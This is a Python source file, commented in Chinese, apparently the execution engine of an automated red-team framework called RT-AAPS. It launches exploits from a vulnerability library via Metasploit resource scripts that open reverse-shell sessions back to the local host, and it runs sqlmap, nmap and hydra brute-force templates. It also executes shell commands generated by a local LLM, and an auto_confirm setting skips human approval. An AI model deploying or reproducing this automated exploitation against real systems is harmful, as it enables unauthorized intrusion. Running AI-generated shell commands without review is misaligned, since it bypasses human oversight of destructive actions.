# -*- coding: utf-8 -*-
"""
RT-AAPS 工具执行引擎
支持：
1. 本地漏洞库精准利用（MSF / sqlmap / nmap 脚本 / hydra）
2. 自定义脚本调用（scripts/ 目录，支持 .sh / .py）
3. 工具库模板匹配（tool_db.json 关键词命中）
4. AI 生成命令兜底
"""
import subprocess
import ollama
import os
import json
import re
from datetime import datetime
from prompts.system_prompts import COMMAND_GENERATOR_PROMPT


class ToolExecutor:
    def __init__(self, config):
        self.config = config
        self.model = config["ollama"]["model"]
        self.timeout = config["system"]["cmd_timeout"]
        self.local_ip = self._get_local_ip()
        self.msf_port = config["system"].get("msf_listen_port", 4444)
        self.base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

        with open(self._abs("paths", "exploit_db"), "r", encoding="utf-8") as f:
            self.exploit_db = json.load(f)
        with open(self._abs("paths", "tool_db"), "r", encoding="utf-8") as f:
            self.tool_db = json.load(f)

    def _abs(self, section, key):
        return os.path.join(self.base_dir, self.config[section][key])

    # ---------- 基础工具 ----------
    def _get_local_ip(self):
        """获取本机 IP，用于反向连接监听"""
        if self.config["system"].get("local_ip", "auto") != "auto":
            return self.config["system"]["local_ip"]
        for cmd in (
            "ip route get 1.1.1.1 2>/dev/null | awk '{print $7}'",
            "hostname -I 2>/dev/null | awk '{print $1}'",
        ):
            try:
                r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                ip = r.stdout.strip()
                if ip and re.match(r"^\d+\.\d+\.\d+\.\d+$", ip.split()[0]):
                    return ip.split()[0]
            except Exception:
                continue
        return "127.0.0.1"

    def _run_cmd(self, cmd, timeout=None):
        """执行系统命令，返回原始输出"""
        timeout = timeout or self.timeout
        print(f"[*] 执行命令：{cmd}")
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=timeout
            )
            output = (result.stdout + result.stderr).strip()
            return output if output else "命令执行完成，无输出"
        except subprocess.TimeoutExpired:
            return "[!] 命令执行超时（已超过限制，可调大 settings.json 的 cmd_timeout）"
        except Exception as e:
            return f"[!] 执行错误：{str(e)}"

    def _confirm(self, msg="确认执行？(y/n)："):
        """人工确认，auto_confirm=true 时跳过"""
        if self.config["system"].get("auto_confirm", False):
            return True
        try:
            return input(msg).strip().lower() == "y"
        except Exception:
            return False

    def _confirm_run(self, cmd, name):
        print(f"[*] 命令：{cmd}")
        if not self._confirm(f"确认执行 {name}？(y/n)："):
            return "用户取消执行"
        return self._run_cmd(cmd)

    # ---------- 对外主入口 ----------
    def execute(self, step):
        """执行单步任务，返回原始输出（策略：漏洞库 > 自定义脚本 > 工具库模板 > AI生成）"""
        action = step.get("action", "")
        target = step.get("target", "")

        # 1. 指定漏洞利用
        vuln_key = step.get("vuln_key") or (
            step.get("detected_vulns", [None])[0] if step.get("detected_vulns") else None
        )
        if vuln_key:
            return self._run_exploit(vuln_key, target)

        # 2. 指定自定义脚本
        script = step.get("script")
        if script:
            return self._run_script(script, target)

        # 3. 工具库模板匹配（关键词命中，执行精准命令）
        cmd = self._match_tool_template(action, target)
        if cmd:
            print(f"[+] 命中工具库模板：{cmd}")
            if not self._confirm():
                return "用户取消执行"
            return self._run_cmd(cmd)

        # 4. AI 生成命令兜底
        return self._ai_generate_run(action, target)

    # ---------- 漏洞利用 ----------
    def _run_exploit(self, vuln_key, target):
        if vuln_key not in self.exploit_db:
            return f"[!] 漏洞 {vuln_key} 不在本地漏洞库中"
        exp = self.exploit_db[vuln_key]
        print(f"[+] 漏洞：{exp['name']}")
        print(f"[+] 描述：{exp.get('description', '')}")

        tool = exp.get("tool", "")
        if tool == "msf":
            return self._msf_exploit(exp, target)
        if tool == "sqlmap":
            url = target if target.startswith("http") else f"http://{target}"
            cmd = exp["cmd_template"].format(url=url, target=target)
            return self._confirm_run(cmd, exp["name"])
        if tool == "nmap":
            cmd = exp["cmd_template"].format(target=target)
            return self._confirm_run(cmd, exp["name"])
        if tool == "hydra":
            cmd = exp["cmd_template"].format(target=target)
            return self._confirm_run(cmd, exp["name"])
        if tool == "manual":
            return f"[!] 需手动利用：{exp.get('hint', '请参考漏洞详情手工操作')}"
        return f"[!] 未识别的利用工具：{tool}"

    def _msf_exploit(self, exp, target):
        """生成 MSF 资源脚本并后台启动攻击"""
        module = exp["module"]
        payload = exp["payload"]
        params = {"RHOSTS": target, "LHOST": self.local_ip, "LPORT": self.msf_port}
        params.update(exp.get("default_params", {}))

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        rc_path = f"/tmp/rt_aaps_{ts}.rc"
        rc_lines = [f"use {module}", f"set PAYLOAD {payload}"]
        for k, v in params.items():
            rc_lines.append(f"set {k} {v}")
        rc_lines += ["set ExitOnSession false", "exploit -j -z", "sessions -l"]
        with open(rc_path, "w", encoding="utf-8") as f:
            f.write("\n".join(rc_lines))

        print(f"[*] MSF 资源脚本已生成：{rc_path}")
        print(f"[*] 模块：{module}")
        print(f"[*] 目标：{target}  →  监听：{self.local_ip}:{self.msf_port}")
        if not self._confirm("确认启动 MSF 攻击？(y/n)："):
            return "用户取消执行"

        # 后台启动，不阻塞主终端
        subprocess.Popen(
            f"msfconsole -q -r {rc_path}",
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        return (
            f"[+] 已后台启动 {exp['name']} 攻击\n"
            f"    模块：{module}\n"
            f"    目标：{target}\n"
            f"    监听：{self.local_ip}:{self.msf_port}\n"
            f"    下一步：新开终端执行 msfconsole -q 输入 sessions -i 查看回弹会话"
        )

    # ---------- 自定义脚本 ----------
    def _run_script(self, script, target):
        script_path = os.path.join(self.base_dir, "scripts", script)
        if not os.path.exists(script_path):
            return f"[!] 自定义脚本不存在：{script_path}"
        if script.endswith(".py"):
            cmd = f"python3 {script_path} {target}"
        else:
            cmd = f"bash {script_path} {target}"
        print(f"[+] 调用自定义脚本：{script}")
        if not self._confirm(f"确认执行自定义脚本 {script}？(y/n)："):
            return "用户取消执行"
        return self._run_cmd(cmd)

    def list_scripts(self):
        """列出 scripts/ 下所有自定义脚本"""
        scripts_root = os.path.join(self.base_dir, "scripts")
        result = []
        if os.path.isdir(scripts_root):
            for root, dirs, files in os.walk(scripts_root):
                for fn in sorted(files):
                    if fn.endswith((".sh", ".py")):
                        rel = os.path.relpath(os.path.join(root, fn), scripts_root)
                        result.append(rel)
        return result

    # ---------- 工具库模板匹配 ----------
    def _match_tool_template(self, action, target):
        action_l = action.lower()
        for tool_name, tool in self.tool_db.items():
            for kw in tool.get("keywords", []):
                if kw in action_l:
                    tpl = tool.get("cmd_template", "")
                    if tpl:
                        return self._fmt_target(tpl, target)
        return None

    def _fmt_target(self, tpl, target):
        """格式化命令模板中的目标，自动补协议"""
        target = (target or "").strip()
        if tpl.startswith("gobuster") or "http://{target}" in tpl:
            if target and not target.startswith("http"):
                target = f"http://{target}"
        elif tpl.startswith("curl"):
            if target and not target.startswith("http"):
                target = f"http://{target}"
        return tpl.format(target=target)

    # ---------- AI 生成命令兜底 ----------
    def _ai_generate_run(self, action, target):
        prompt = COMMAND_GENERATOR_PROMPT.format(action=action, target=target)
        print("[*] 未命中模板，AI 正在生成命令...")
        try:
            resp = ollama.chat(
                model=self.model,
                messages=[{"role": "user", "content": prompt}],
                options={"temperature": 0},
            )
            cmd = resp["message"]["content"].strip().split("\n")[0].strip()
        except Exception as e:
            return f"[!] AI 调用失败：{str(e)}，请确认 Ollama 服务已启动"

        cmd = re.sub(r"[`'\"]", "", cmd)
        if not cmd:
            return "[!] AI 未生成有效命令，建议换一种说法或手动执行"
        print(f"[*] AI 生成命令：{cmd}")
        if not self._confirm():
            return "用户取消执行"
        return self._run_cmd(cmd)
